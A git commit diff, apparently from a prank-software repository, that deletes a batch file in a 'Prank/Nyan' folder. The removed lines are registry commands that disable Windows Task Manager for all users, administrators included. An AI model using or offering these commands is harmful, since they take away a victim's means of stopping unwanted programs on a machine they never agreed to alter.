850676aed31f7e3f6f1a34b5a4acc58f3e763090
Ludicro <65253062+Ludicro@users.noreply.github.com>
2025-02-19 14:53:07 -0500

    reorganizing

--- Prank/Nyan/test.bat
+++
@@ -1,3 +0,0 @@
-:: Disable Task Manager (for ALL users, even Admins)
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V "DisableTaskMgr" /T REG_DWORD /D 1 /F
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /V "DisableTaskMgr" /T REG_DWORD /D 1 /F
